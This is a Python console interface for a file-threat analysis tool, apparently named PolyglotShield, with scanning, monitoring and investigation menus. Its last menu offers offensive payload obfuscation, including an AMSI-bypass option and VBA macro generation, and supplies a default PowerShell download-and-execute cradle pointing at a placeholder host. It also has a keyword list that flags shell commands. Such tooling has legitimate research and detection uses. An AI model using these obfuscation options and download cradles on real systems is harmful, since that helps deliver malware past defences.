        files = [target] if os.path.isfile(target) else \
                [os.path.join(r, f) for r, _, fs in os.walk(target)
                 for f in fs if not f.startswith('.')][:100]

        console.print(f"\n[dim]Analyzing {len(files)} files...[/dim]\n")

        with Progress(SpinnerColumn(), TextColumn("[bold]{task.description}"),
                     BarColumn(), TaskProgressColumn(), console=console) as progress:
            task = progress.add_task("Deep analysis...", total=len(files))

            for fpath in files:
                fname = os.path.basename(fpath)
                findings_count = 0

                try:
                    # Format Parser
                    if choice in ("1", "8"):
                        try:
                            from engines.format_parser import FormatParser
                            fp = FormatParser()
                            result = fp.differential_analysis(fpath)
                            if result.mismatches or result.anomalies:
                                findings_count += len(result.mismatches) + len(result.anomalies)
                                sev = "critical" if result.risk_score > 0.5 else "warning"
                                console.print(f"  [{'bold red' if sev=='critical' else 'yellow'}]"
                                            f"[{sev.upper()}][/bold red] 📋 {fname}")
                                for m in result.mismatches:
                                    console.print(f"    [yellow]MISMATCH:[/yellow] {m}")
                                for a in result.anomalies:
                                    console.print(f"    [yellow]ANOMALY:[/yellow] {a}")
                        except Exception as e:
                            console.print(f"  [dim]📋 Format parser: {e}[/dim]")

                    # Steganography
                    if choice in ("2", "8"):
                        try:
                            from engines.stego_detector import StegoDetector
                            sd = StegoDetector()
                            steg_findings = sd.analyze(fpath)
                            for sf in steg_findings:
                                if sf.severity in ("critical", "high"):
                                    findings_count += 1
                                    console.print(f"  [bold red][{sf.severity.upper()}][/bold red]"
                                                f" 🖼 {fname}: {sf.description}")
                        except Exception as e:
                            console.print(f"  [dim]🖼 Stego: {e}[/dim]")

                    # PE Analysis
                    if choice in ("3", "8"):
                        ext = os.path.splitext(fpath)[1].lower()
                        if ext in (".exe", ".dll", ".sys", ".scr", ".ocx", ".bin") or choice == "3":
                            try:
                                from engines.pe_analyzer import PEAnalyzer
                                pe = PEAnalyzer()
                                pe_findings = pe.analyze(fpath)
                                for pf in pe_findings:
                                    if pf.severity in ("critical", "high"):
                                        findings_count += 1
                                        console.print(f"  [bold red][{pf.severity.upper()}][/bold red]"
                                                    f" 💻 {fname} [{pf.category}]: {pf.description}")
                            except Exception as e:
                                console.print(f"  [dim]💻 PE: {e}[/dim]")

                    # ELF Analysis
                    if choice in ("4", "8"):
                        ext = os.path.splitext(fpath)[1].lower()
                        if ext in (".elf", ".so", ".o", ".ko", ".bin") or choice == "4":
                            try:
                                from engines.elf_analyzer import ELFAnalyzer
                                ef = ELFAnalyzer()
                                elf_findings = ef.analyze(fpath)
                                for ef_f in elf_findings:
                                    if ef_f.severity in ("critical", "high"):
                                        findings_count += 1
                                        console.print(f"  [bold red][{ef_f.severity.upper()}][/bold red]"
                                                    f" 🐧 {fname} [{ef_f.category}]: {ef_f.description}")
                            except Exception as e:
                                console.print(f"  [dim]🐧 ELF: {e}[/dim]")

                    # Office Macro Analysis
                    if choice in ("5", "8"):
                        ext = os.path.splitext(fpath)[1].lower()
                        if ext in (".doc", ".xls", ".ppt", ".docx", ".xlsx", ".pptx",
                                   ".docm", ".xlsm", ".pptm", ".rtf") or choice == "5":
                            try:
                                from engines.office_analyzer import OfficeAnalyzer
                                oa = OfficeAnalyzer()
                                macro_findings = oa.analyze(fpath)
                                for mf in macro_findings:
                                    if mf.severity in ("critical", "high"):
                                        findings_count += 1
                                        console.print(f"  [bold red][{mf.severity.upper()}][/bold red]"
                                                    f" 📄 {fname} [{mf.category}]: {mf.description}")
                                        if mf.vba_snippet:
                                            console.print(f"    [dim]{mf.vba_snippet[:80]}[/dim]")
                            except Exception as e:
                                console.print(f"  [dim]📄 Office: {e}[/dim]")

                    # Archive Recursion
                    if choice in ("6", "8"):
                        ext = os.path.splitext(fpath)[1].lower()
                        if ext in (".zip", ".rar", ".7z", ".gz", ".bz2", ".xz",
                                   ".tar", ".cab", ".jar", ".apk") or choice == "6":
                            try:
                                from engines.archive_scanner import ArchiveScanner
                                ars = ArchiveScanner()
                                arch_findings = ars.scan(fpath)
                                for af in arch_findings:
                                    if af.severity in ("critical", "high"):
                                        findings_count += 1
                                        console.print(f"  [bold red][{af.severity.upper()}][/bold red]"
                                                    f" 📦 {fname} [{af.category}]: {af.description}")
                            except Exception as e:
                                console.print(f"  [dim]📦 Archive: {e}[/dim]")

                    if findings_count == 0:
                        console.print(f"  [green]✓ {fname}[/green] [dim]— clean[/dim]")

                except Exception as e:
                    console.print(f"  [red]✗ {fname}: {e}[/red]")

                progress.advance(task)

        # ONNX Export
        if choice == "7":
            console.print("\n[cyan]Exporting CatBoost model to ONNX...[/cyan]")
            try:
                from engines.onnx_export import ONNXExporter
                exporter = ONNXExporter()
                result = exporter.export()
                if result.get("status") == "success":
                    console.print(f"[green]✓ ONNX model exported: {result['output']}[/green]")
                    console.print(f"  Size: {result['size']:,} bytes")
                    console.print(f"  Features: {result['features']}")
                else:
                    console.print(f"[red]✗ Export failed: {result.get('error')}[/red]")
            except Exception as e:
                console.print(f"[red]✗ ONNX export error: {e}[/red]")

    # ── Monitoring Panel ─────────────────────────────────────────

    def menu_monitoring(self):
        console.print()
        console.print(Panel("[bold magenta]📡 MONITORING PANEL[/bold magenta]", border_style="magenta"))
        console.print("  [magenta]1[/magenta] │ 📋 Live Logs Panel")
        console.print("  [magenta]2[/magenta] │ ⚡ Realtime Events")
        console.print("  [magenta]3[/magenta] │ 🔄 Process Viewer")
        console.print("  [magenta]4[/magenta] │ 🔌 Connection Viewer")
        console.print("  [magenta]5[/magenta] │ 🚨 Alerts Panel")
        console.print("  [magenta]6[/magenta] │ 📁 File Change Monitor")
        console.print("  [magenta]7[/magenta] │ 💻 Terminal Activity Feed")
        console.print("  [magenta]8[/magenta] │ 📝 Workspace Audit Log")
        console.print("  [magenta]9[/magenta] │ 🔁 Session Replay")

        choice = self.safe_input("\n[bold magenta]Select[/bold magenta]",
                                 choices=["1","2","3","4","5","6","7","8","9"], default="1")
        if choice is None: return

        if choice == "1":
            self._live_logs_panel()
        elif choice == "2":
            self._realtime_events()
        elif choice == "3":
            self._process_viewer()
        elif choice == "4":
            self._connection_viewer()
        elif choice == "5":
            self._alerts_panel()
        elif choice == "6":
            self._file_change_monitor()
        elif choice == "7":
            self._terminal_activity_feed()
        elif choice == "8":
            self._workspace_audit_log()
        elif choice == "9":
            self._session_replay()

    def _live_logs_panel(self):
        """Live scrolling log panel."""
        console.print()
        console.print(Panel("[bold magenta]📋 LIVE LOGS[/bold magenta]", border_style="magenta"))
        log_dir = os.path.expanduser("~/.polyglot/logs")
        if not os.path.isdir(log_dir):
            console.print("[yellow]No logs directory found. Logs will appear after scans.[/yellow]")
            return
        log_files = sorted(Path(log_dir).glob("*.log"), key=lambda p: p.stat().st_mtime, reverse=True)
        if not log_files:
            console.print("[dim]No log files yet.[/dim]")
            return
        console.print(f"[dim]Showing last 50 lines from: {log_files[0].name}[/dim]\n")
        try:
            with open(log_files[0]) as f:
                lines = f.readlines()[-50:]
            for line in lines:
                line = line.rstrip()
                if "ERROR" in line or "CRITICAL" in line:
                    console.print(f"[red]{line}[/red]")
                elif "WARNING" in line:
                    console.print(f"[yellow]{line}[/yellow]")
                elif "THREAT" in line:
                    console.print(f"[bold red]{line}[/bold red]")
                else:
                    console.print(f"[dim]{line}[/dim]")
        except Exception as e:
            console.print(f"[red]Error reading log: {e}[/red]")

    def _realtime_events(self):
        """Show recent security events."""
        console.print()
        console.print(Panel("[bold magenta]⚡ REALTIME EVENTS[/bold magenta]", border_style="magenta"))
        events = list(self.alerts)[-20:]
        if not events:
            console.print("[dim]No events recorded yet. Run scans to generate events.[/dim]")
            return
        for ev in events:
            sev = ev.get("severity", "info")
            styles = {"critical": "bold red", "high": "red", "warning": "yellow", "info": "dim"}
            console.print(f"  [{styles.get(sev, 'white')}][{sev.upper()}][/{styles.get(sev, 'white')}] "
                        f"{ev.get('time', '')} — {ev.get('message', '')}")

    def _process_viewer(self):
        """Show running PolyglotShield processes."""
        console.print()
        console.print(Panel("[bold magenta]🔄 PROCESS VIEWER[/bold magenta]", border_style="magenta"))
        try:
            result = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=5)
            procs = [l for l in result.stdout.split("\n") if "polyglot" in l.lower() or "python" in l.lower()]
            if procs:
                for p in procs[:20]:
                    console.print(f"  [dim]{p[:120]}[/dim]")
            else:
                console.print("[dim]No PolyglotShield processes running.[/dim]")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")

    def _connection_viewer(self):
        """Show active network connections."""
        console.print()
        console.print(Panel("[bold magenta]🔌 CONNECTION VIEWER[/bold magenta]", border_style="magenta"))
        try:
            result = subprocess.run(["ss", "-tuln"], capture_output=True, text=True, timeout=5)
            lines = result.stdout.strip().split("\n")[:20]
            for line in lines:
                console.print(f"  [dim]{line[:120]}[/dim]")
        except Exception:
            try:
                result = subprocess.run(["netstat", "-tuln"], capture_output=True, text=True, timeout=5)
                lines = result.stdout.strip().split("\n")[:20]
                for line in lines:
                    console.print(f"  [dim]{line[:120]}[/dim]")
            except Exception as e:
                console.print(f"[red]Error: {e}[/red]")

    def _alerts_panel(self):
        """Show all alerts with severity filtering."""
        console.print()
        console.print(Panel("[bold magenta]🚨 ALERTS[/bold magenta]", border_style="magenta"))
        alerts = list(self.alerts)
        if not alerts:
            console.print("[dim]No alerts. All clear.[/dim]")
            return
        crit = [a for a in alerts if a.get("severity") == "critical"]
        high = [a for a in alerts if a.get("severity") == "high"]
        warn = [a for a in alerts if a.get("severity") == "warning"]
        console.print(f"  [bold red]Critical: {len(crit)}[/bold red]  "
                    f"[red]High: {len(high)}[/red]  "
                    f"[yellow]Warning: {len(warn)}[/yellow]  "
                    f"[dim]Total: {len(alerts)}[/dim]\n")
        for a in alerts[-15:]:
            sev = a.get("severity", "info")
            styles = {"critical": "bold white on red", "high": "bold red", "warning": "yellow"}
            console.print(f"  [{styles.get(sev, 'dim')}][{sev.upper()}][/{styles.get(sev, 'dim')}] "
                        f"{a.get('message', '')}")

    def _file_change_monitor(self):
        """Monitor directory for file changes."""
        console.print()
        console.print(Panel("[bold magenta]📁 FILE CHANGE MONITOR[/bold magenta]", border_style="magenta"))
        directory = self.safe_input("[bold cyan]Watch directory[/bold cyan]",
                                     default=str(Path.home() / "Downloads"))
        if directory is None: return
        if not os.path.isdir(directory):
            console.print(f"[red]✗ Not a directory: {directory}[/red]")
            return
        console.print(f"\n[green]▶ Monitoring: {directory}[/green]")
        console.print("[dim]Press Ctrl+C to stop[/dim]\n")
        try:
            before = {}
            for root, dirs, files in os.walk(directory):
                for f in files:
                    fp = os.path.join(root, f)
                    try:
                        before[fp] = os.path.getmtime(fp)
                    except Exception:
                        pass
            console.print(f"  [dim]Baseline: {len(before)} files indexed[/dim]")
            changes = 0
            while True:
                time.sleep(2)
                after = {}
                for root, dirs, files in os.walk(directory):
                    for f in files:
                        fp = os.path.join(root, f)
                        try:
                            after[fp] = os.path.getmtime(fp)
                        except Exception:
                            pass
                for fp, mtime in after.items():
                    if fp not in before:
                        console.print(f"  [green]+ NEW:[/green] {os.path.basename(fp)}")
                        changes += 1
                    elif mtime != before[fp]:
                        console.print(f"  [yellow]~ MODIFIED:[/yellow] {os.path.basename(fp)}")
                        changes += 1
                for fp in before:
                    if fp not in after:
                        console.print(f"  [red]- DELETED:[/red] {os.path.basename(fp)}")
                        changes += 1
                before = after
                if changes > 0:
                    self.stats['threats'] += changes
        except KeyboardInterrupt:
            console.print(f"\n[dim]Stopped. {changes} changes detected.[/dim]")

    def _terminal_activity_feed(self):
        """Show terminal/command activity."""
        console.print()
        console.print(Panel("[bold magenta]💻 TERMINAL ACTIVITY[/bold magenta]", border_style="magenta"))
        history_file = os.path.expanduser("~/.bash_history")
        if os.path.exists(history_file):
            try:
                with open(history_file) as f:
                    lines = f.readlines()[-30:]
                console.print("[dim]Last 30 commands:[/dim]\n")
                for line in lines:
                    line = line.rstrip()
                    if any(k in line.lower() for k in ("curl", "wget", "chmod", "rm ", "eval", "exec")):
                        console.print(f"  [red]⚠ {line}[/red]")
                    else:
                        console.print(f"  [dim]{line}[/dim]")
            except Exception as e:
                console.print(f"[red]Error: {e}[/red]")
        else:
            console.print("[dim]No bash history found.[/dim]")

    def _workspace_audit_log(self):
        """Show workspace audit trail."""
        console.print()
        console.print(Panel("[bold magenta]📝 WORKSPACE AUDIT LOG[/bold magenta]", border_style="magenta"))
        audit_path = os.path.expanduser("~/.polyglot/audit.jsonl")
        if not os.path.exists(audit_path):
            console.print("[dim]No audit log yet. Run scans to generate entries.[/dim]")
            return
        try:
            with open(audit_path) as f:
                lines = f.readlines()[-30:]
            for line in lines:
                try:
                    entry = json.loads(line.strip())
                    sev = entry.get("severity", "info")
                    styles = {"critical": "bold red", "high": "red", "warning": "yellow", "info": "dim"}
                    console.print(f"  [{styles.get(sev, 'white')}]{entry.get('timestamp', '')} "
                                f"[{sev.upper()}] {entry.get('message', '')}[/{styles.get(sev, 'white')}]")
                except Exception:
                    console.print(f"  [dim]{line.strip()[:120]}[/dim]")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")

    def _session_replay(self):
        """Replay a previous scan session."""
        console.print()
        console.print(Panel("[bold magenta]🔁 SESSION REPLAY[/bold magenta]", border_style="magenta"))
        sessions_dir = os.path.expanduser("~/.polyglot/sessions")
        if not os.path.isdir(sessions_dir):
            console.print("[dim]No recorded sessions yet.[/dim]")
            return
        sessions = sorted(Path(sessions_dir).glob("*.json"), key=lambda p: p.stat().st_mtime, reverse=True)
        if not sessions:
            console.print("[dim]No sessions found.[/dim]")
            return
        console.print("[dim]Recent sessions:[/dim]")
        for i, s in enumerate(sessions[:10]):
            console.print(f"  [cyan]{i+1}[/cyan] │ {s.name}")
        choice = self.safe_input("[cyan]Session number[/cyan]",
                                 choices=[str(i+1) for i in range(min(10, len(sessions)))])
        if choice is None: return
        try:
            with open(sessions[int(choice)-1]) as f:
                session = json.load(f)
            console.print(f"\n[bold]Session: {session.get('name', 'Unknown')}[/bold]")
            console.print(f"  Time: {session.get('timestamp', 'Unknown')}")
            console.print(f"  Files scanned: {session.get('files_scanned', 0)}")
            console.print(f"  Threats found: {session.get('threats', 0)}")
            console.print(f"\n[dim]Events:[/dim]")
            for ev in session.get("events", [])[-20:]:
                console.print(f"  {ev}")
        except Exception as e:
            console.print(f"[red]Error replaying session: {e}[/red]")

    # ── Investigation Panel ──────────────────────────────────────

    def menu_investigation(self):
        console.print()
        console.print(Panel("[bold blue]🔍 INVESTIGATION PANEL[/bold blue]", border_style="blue"))
        console.print("  [blue]1[/blue] │ 🔎 Searchable Logs")
        console.print("  [blue]2[/blue] │ 📅 Timeline View")
        console.print("  [blue]3[/blue] │ 📸 Compare Snapshots")
        console.print("  [blue]4[/blue] │ 🔗 Request Correlation")
        console.print("  [blue]5[/blue] │ 🏷  Tagged Events")
        console.print("  [blue]6[/blue] │ 🔖 Bookmark Incidents")
        console.print("  [blue]7[/blue] │ 📤 Export Investigation")
        console.print("  [blue]8[/blue] │ 📝 Notes Sidebar")
        console.print("  [blue]9[/blue] │ 📁 Evidence Folder")

        choice = self.safe_input("\n[bold blue]Select[/bold blue]",
                                 choices=["1","2","3","4","5","6","7","8","9"], default="1")
        if choice is None: return

        if choice == "1":
            self._searchable_logs()
        elif choice == "2":
            self._timeline_view()
        elif choice == "3":
            self._compare_snapshots()
        elif choice == "4":
            self._request_correlation()
        elif choice == "5":
            self._tagged_events()
        elif choice == "6":
            self._bookmark_incidents()
        elif choice == "7":
            self._export_investigation()
        elif choice == "8":
            self._notes_sidebar()
        elif choice == "9":
            self._evidence_folder()

    def _searchable_logs(self):
        """Full-text search across all logs."""
        console.print()
        console.print(Panel("[bold blue]🔎 SEARCHABLE LOGS[/bold blue]", border_style="blue"))
        query = self.safe_input("[bold cyan]Search query[/bold cyan]")
        if not query: return

        log_dir = os.path.expanduser("~/.polyglot/logs")
        if not os.path.isdir(log_dir):
            console.print("[yellow]No logs directory found.[/yellow]")
            return

        matches = 0
        for logfile in Path(log_dir).glob("*.log"):
            try:
                with open(logfile) as f:
                    for i, line in enumerate(f, 1):
                        if query.lower() in line.lower():
                            matches += 1
                            console.print(f"  [cyan]{logfile.name}:{i}[/cyan] {line.rstrip()[:120]}")
                            if matches >= 50:
                                break
            except Exception:
                pass
            if matches >= 50:
                break

        if matches == 0:
            console.print(f"[dim]No matches for '{query}'[/dim]")
        else:
            console.print(f"\n[dim]{matches} matches found[/dim]")

    def _timeline_view(self):
        """Chronological event timeline."""
        console.print()
        console.print(Panel("[bold blue]📅 TIMELINE VIEW[/bold blue]", border_style="blue"))

        # Collect events from various sources
        events = []

        # From alerts
        for alert in self.alerts:
            events.append({"time": alert.get("time", ""), "type": "alert",
                          "message": alert.get("message", ""), "severity": alert.get("severity", "")})

        # From audit log
        audit_path = os.path.expanduser("~/.polyglot/audit.jsonl")
        if os.path.exists(audit_path):
            try:
                with open(audit_path) as f:
                    for line in f.readlines()[-100:]:
                        try:
                            entry = json.loads(line.strip())
                            events.append({"time": entry.get("timestamp", ""), "type": "audit",
                                          "message": entry.get("message", ""), "severity": entry.get("severity", "")})
                        except Exception:
                            pass
            except Exception:
                pass

        if not events:
            console.print("[dim]No events to display. Run scans first.[/dim]")
            return

        # Sort by time
        events.sort(key=lambda e: e.get("time", ""))

        console.print(f"[dim]{len(events)} events — showing last 30:[/dim]\n")
        for ev in events[-30:]:
            sev = ev.get("severity", "info")
            styles = {"critical": "bold red", "high": "red", "warning": "yellow", "info": "dim"}
            console.print(f"  [{styles.get(sev, 'white')}]{ev.get('time', '?'):>19} "
                        f"[{sev:>8}] {ev.get('message', '')[:80]}[/{styles.get(sev, 'white')}]")

    def _compare_snapshots(self):
        """Compare two scan snapshots."""
        console.print()
        console.print(Panel("[bold blue]📸 COMPARE SNAPSHOTS[/bold blue]", border_style="blue"))
        console.print("[dim]Compare two directory states to find changes.[/dim]\n")

        dir1 = self.safe_input("[bold cyan]First snapshot (directory)[/bold cyan]")
        if dir1 is None: return
        dir2 = self.safe_input("[bold cyan]Second snapshot (directory)[/bold cyan]")
        if dir2 is None: return

        if not os.path.isdir(dir1) or not os.path.isdir(dir2):
            console.print("[red]Both must be valid directories.[/red]")
            return

        def get_file_hashes(directory):
            hashes = {}
            for root, _, files in os.walk(directory):
                for f in files:
                    fp = os.path.join(root, f)
                    try:
                        with open(fp, "rb") as fh:
                            h = hashlib.sha256(fh.read()).hexdigest()[:16]
                        hashes[f] = h
                    except Exception:
                        pass
            return hashes

        snap1 = get_file_hashes(dir1)
        snap2 = get_file_hashes(dir2)

        added = [f for f in snap2 if f not in snap1]
        removed = [f for f in snap1 if f not in snap2]
        modified = [f for f in snap1 if f in snap2 and snap1[f] != snap2[f]]

        console.print(f"  [green]+ Added: {len(added)}[/green]")
        for f in added[:10]:
            console.print(f"    [green]+ {f}[/green]")
        console.print(f"  [red]- Removed: {len(removed)}[/red]")
        for f in removed[:10]:
            console.print(f"    [red]- {f}[/red]")
        console.print(f"  [yellow]~ Modified: {len(modified)}[/yellow]")
        for f in modified[:10]:
            console.print(f"    [yellow]~ {f}[/yellow]")

    def _request_correlation(self):
        """Correlate findings across multiple scans."""
        console.print()
        console.print(Panel("[bold blue]🔗 REQUEST CORRELATION[/bold blue]", border_style="blue"))
        target = self.safe_input("[bold cyan]Target directory to correlate[/bold cyan]")
        if target is None: return
        if not os.path.isdir(target):
            console.print(f"[red]✗ Not found: {target}[/red]")
            return

        # Run all engines and correlate
        console.print(f"\n[dim]Correlating findings in {target}...[/dim]\n")
        correlated = {}
        threat_files = []  # Track files with critical/high findings
        threat_seen = set()
        files = [os.path.join(r, f) for r, _, fs in os.walk(target)
                 for f in fs if not f.startswith('.')][:50]

        for fpath in files:
            fname = os.path.basename(fpath)
            try:
                findings = self.detector.scan_file(fpath)
                if findings:
                    crit = [f for f in findings if f.get('severity') in ('critical','high')]
                    if crit and fpath not in threat_seen:
                        threat_seen.add(fpath)
                        threat_files.append((fpath, findings))
                    for f in findings:
                        ftype = f.get("type", "unknown")
                        if ftype not in correlated:
                            correlated[ftype] = []
                        correlated[ftype].append({"file": fname, **f})
            except Exception:
                pass

        if not correlated:
            console.print("[green]✓ No correlated threats found.[/green]")
            return

        for ftype, instances in sorted(correlated.items(), key=lambda x: -len(x[1])):
            console.print(f"  [bold red]{ftype}[/bold red] ({len(instances)} instances)")
            for inst in instances[:5]:
                console.print(f"    {inst['file']}: {inst.get('detail', '')[:80]}")

        # Offer quarantine for correlated threats
        if threat_files and self.quarantine_mgr:
            console.print()
            q_choice = self.safe_input(
                f"[bold cyan]Quarantine {len(threat_files)} threat files?[/bold cyan] "
                "[dim]([green]a[/green]=all, [yellow]i[/yellow]=interactive, [red]n[/red]=skip)[/dim]",
                default="n", choices=["a", "i", "n"]
            )
            if q_choice == "a":
                for fpath, findings in threat_files:
                    scan_result = self._findings_to_scan_result(fpath, findings)
                    qid = self.quarantine_mgr.quarantine(fpath, scan_result, force=True)
                    if qid:
                        console.print(f"    [red]🔒 Quarantined[/red] {os.path.basename(fpath)} [dim](ID: {qid})[/dim]")
            elif q_choice == "i":
                for fpath, findings in threat_files:
                    fname = os.path.basename(fpath)
                    do_q = self.safe_confirm(f"  Quarantine [red]{fname}[/red]?", default=True)
                    if do_q:
                        scan_result = self._findings_to_scan_result(fpath, findings)
                        qid = self.quarantine_mgr.quarantine(fpath, scan_result, force=True)
                        if qid:
                            console.print(f"    [red]🔒 Quarantined[/red] {fname} [dim](ID: {qid})[/dim]")

    def _tagged_events(self):
        """View events by tags."""
        console.print()
        console.print(Panel("[bold blue]🏷 TAGGED EVENTS[/bold blue]", border_style="blue"))
        tags_path = os.path.expanduser("~/.polyglot/tags.json")
        if not os.path.exists(tags_path):
            console.print("[dim]No tags yet. Tags are created during investigation.[/dim]")
            return
        try:
            with open(tags_path) as f:
                tags = json.load(f)
            for tag, events in tags.items():
                console.print(f"\n  [bold cyan]#{tag}[/bold cyan] ({len(events)} events)")
                for ev in events[:5]:
                    console.print(f"    [dim]{ev}[/dim]")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")

    def _bookmark_incidents(self):
        """Manage bookmarked incidents."""
        console.print()
        console.print(Panel("[bold blue]🔖 BOOKMARK INCIDENTS[/bold blue]", border_style="blue"))
        bm_path = os.path.expanduser("~/.polyglot/bookmarks.json")
        if not os.path.exists(bm_path):
            console.print("[dim]No bookmarks yet.[/dim]")
            add = self.safe_confirm("[cyan]Add a bookmark?[/cyan]", default=False)
            if add:
                note = self.safe_input("[cyan]Bookmark note[/cyan]")
                if note:
                    bookmarks = [{"time": time.strftime("%Y-%m-%d %H:%M:%S"), "note": note}]
                    os.makedirs(os.path.dirname(bm_path), exist_ok=True)
                    with open(bm_path, "w") as f:
                        json.dump(bookmarks, f, indent=2)
                    console.print("[green]✓ Bookmark saved.[/green]")
            return
        try:
            with open(bm_path) as f:
                bookmarks = json.load(f)
            for i, bm in enumerate(bookmarks):
                console.print(f"  [cyan]{i+1}[/cyan] │ [{bm.get('time', '')}] {bm.get('note', '')}")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")

    def _export_investigation(self):
        """Export investigation data."""
        console.print()
        console.print(Panel("[bold blue]📤 EXPORT INVESTIGATION[/bold blue]", border_style="blue"))
        export_path = self.safe_input("[bold cyan]Export path[/bold cyan]",
                                       default="investigation_export.json")
        if export_path is None: return

        data = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "stats": dict(self.stats),
            "alerts": list(self.alerts),
            "audit_log": [],
        }

        # Include audit log
        audit_path = os.path.expanduser("~/.polyglot/audit.jsonl")
        if os.path.exists(audit_path):
            try:
                with open(audit_path) as f:
                    data["audit_log"] = [json.loads(l) for l in f.readlines()[-500:]]
            except Exception:
                pass

        with open(export_path, "w") as f:
            json.dump(data, f, indent=2, default=str)
        console.print(f"[green]✓ Investigation exported: {export_path}[/green]")

    def _notes_sidebar(self):
        """Investigation notes."""
        console.print()
        console.print(Panel("[bold blue]📝 NOTES SIDEBAR[/bold blue]", border_style="blue"))
        notes_path = os.path.expanduser("~/.polyglot/notes.md")
        if os.path.exists(notes_path):
            with open(notes_path) as f:
                content = f.read()
            if content:
                console.print(content[:2000])
                if len(content) > 2000:
                    console.print(f"\n[dim]... ({len(content)} chars total)[/dim]")

        console.print("\n[dim]Enter note (empty to skip):[/dim]")
        note = self.safe_input("[cyan]Note[/cyan]")
        if note:
            os.makedirs(os.path.dirname(notes_path), exist_ok=True)
            with open(notes_path, "a") as f:
                f.write(f"\n## {time.strftime('%Y-%m-%d %H:%M:%S')}\n{note}\n")
            console.print("[green]✓ Note saved.[/green]")

    def _evidence_folder(self):
        """Manage evidence folder."""
        console.print()
        console.print(Panel("[bold blue]📁 EVIDENCE FOLDER[/bold blue]", border_style="blue"))
        evidence_dir = os.path.expanduser("~/.polyglot/evidence")
        os.makedirs(evidence_dir, exist_ok=True)

        console.print(f"[dim]Evidence directory: {evidence_dir}[/dim]\n")

        # List existing evidence
        evidence = list(Path(evidence_dir).glob("*"))
        if evidence:
            for ef in sorted(evidence, key=lambda p: p.stat().st_mtime, reverse=True)[:20]:
                size = ef.stat().st_size
                mtime = time.strftime("%Y-%m-%d %H:%M", time.localtime(ef.stat().st_mtime))
                console.print(f"  [cyan]{ef.name}[/cyan] ({size:,} bytes, {mtime})")

        console.print("\n[cyan]1[/cyan] │ Add file to evidence")
        console.print("[cyan]2[/cyan] │ Export evidence folder")
        choice = self.safe_input("[cyan]Action[/cyan]", choices=["1", "2"])
        if choice == "1":
            fpath = self.safe_input("[cyan]File to add[/cyan]")
            if fpath and os.path.isfile(fpath):
                import shutil
                dest = os.path.join(evidence_dir, os.path.basename(fpath))
                shutil.copy2(fpath, dest)
                console.print(f"[green]✓ Added to evidence: {dest}[/green]")
        elif choice == "2":
            console.print(f"[dim]Evidence folder: {evidence_dir}[/dim]")

    # ── Benchmark & Fuzzing Menu ─────────────────────────────────

    def menu_benchmark(self):
        console.print()
        console.print(Panel("[bold yellow]🧪 BENCHMARK & ONNX[/bold yellow]", border_style="yellow"))
        console.print("  [yellow]1[/yellow] │ Generate Benchmark Dataset")
        console.print("  [yellow]2[/yellow] │ Run CI Regression Tests")
        console.print("  [yellow]3[/yellow] │ ONNX Model Export + Validate")

        choice = self.safe_input("\n[bold yellow]Select[/bold yellow]",
                                 choices=["1","2","3"], default="1")
        if choice is None: return

        if choice == "1":
            console.print("\n[cyan]Generating benchmark dataset...[/cyan]")
            try:
                from engines.onnx_export import BenchmarkGenerator
                gen = BenchmarkGenerator()
                result = gen.generate()
                console.print(f"[green]✓ Generated {result.get('total_files', 0)} benchmark files[/green]")
                for name, info in result.get("tests", {}).items():
                    console.print(f"  {name}: {info.get('count', 0)} files "
                                f"(expect {info.get('expected_detections', 0)} detections)")
            except Exception as e:
                console.print(f"[red]✗ Error: {e}[/red]")

        elif choice == "2":
            console.print("\n[cyan]Running CI regression tests...[/cyan]")
            try:
                from engines.onnx_export import CIRegressionTester
                tester = CIRegressionTester()
                results = tester.run()
                console.print(f"\n[bold]Results: {results['passed']}/{results['total']} passed[/bold]")
                for t in results.get("tests", []):
                    icon = "[green]✓[/green]" if t["status"] == "PASS" else "[red]✗[/red]"
                    console.print(f"  {icon} {t['name']}: {t['actual']}/{t['expected']} detections "
                                f"({t['files_tested']} files)")
            except Exception as e:
                console.print(f"[red]✗ Error: {e}[/red]")

        elif choice == "3":
            console.print("\n[cyan]Exporting model to ONNX...[/cyan]")
            try:
                from engines.onnx_export import ONNXExporter
                exporter = ONNXExporter()
                result = exporter.export()
                if result.get("status") == "success":
                    console.print(f"[green]✓ Exported: {result['output']}[/green]")
                    # Validate
                    console.print("[cyan]Validating ONNX model...[/cyan]")
                    val = exporter.validate(result["output"])
                    if val.get("status") == "valid":
                        console.print(f"[green]✓ Valid ONNX model[/green]")
                        console.print(f"  Providers: {val.get('providers', [])}")
                    else:
                        console.print(f"[yellow]Validation: {val}[/yellow]")
                else:
                    console.print(f"[red]✗ {result.get('error')}[/red]")
            except Exception as e:
                console.print(f"[red]✗ Error: {e}[/red]")


    def menu_payload_evasion(self):
        console.print()
        console.print(Panel("[bold red]💣 PAYLOAD & EVASION[/bold red]", border_style="red"))
        console.print("  [red]1[/red] │ ⚡ PowerShell Obfuscation")
        console.print("  [red]2[/red] │ 📄 VBA Macro Generation")
        console.print("  [red]3[/red] │ 🌐 JavaScript Loader")
        console.print("  [red]4[/red] │ 🦠 Fileless Execution")
        console.print("  [red]5[/red] │ 🔍 Sandbox Detection Payload")
        console.print("  [red]6[/red] │ 📊 AV Behavior Prediction")
        console.print("  [red]7[/red] │ 🎯 Static Detection Scoring")
        choice = self.safe_input("\n[bold red]Select[/bold red]", choices=["1","2","3","4","5","6","7"], default="1")
        if choice is None: return
        try:
            from engines.payload_mutator import PayloadMutator
            from engines.risk_engine import RiskScoringEngine
            mutator = PayloadMutator()
            if choice == "1":
                p = self.safe_input("[cyan]PS payload[/cyan]", default="IEX (New-Object Net.WebClient).DownloadString('http://e.com/p')")
                if not p: return
                t = self.safe_input("[cyan]Technique[/cyan]", choices=["auto","string_concat","base64","xor","amsi_bypass","env_var","caret","tick","format_string","reverse"], default="auto")
                if t is None: return
                r = mutator.obfuscate_powershell(p, t)
                console.print(f"\n[green]Technique: {r.technique}[/green]")
                console.print(f"[yellow]Detection: {r.detection_score:.0%}[/yellow]")
                for n in r.evasion_notes: console.print(f"  [dim]info {n}[/dim]")
                console.print(f"\n{r.obfuscated_code}")
            elif choice == "2":
                p = self.safe_input("[cyan]Cmd[/cyan]", default="cmd /c calc.exe")
                if not p: return
                r = mutator.generate_vba_macro(p)
                console.print(f"\n[yellow]Detection: {r.detection_score:.0%}[/yellow]\n{r.obfuscated_code}")
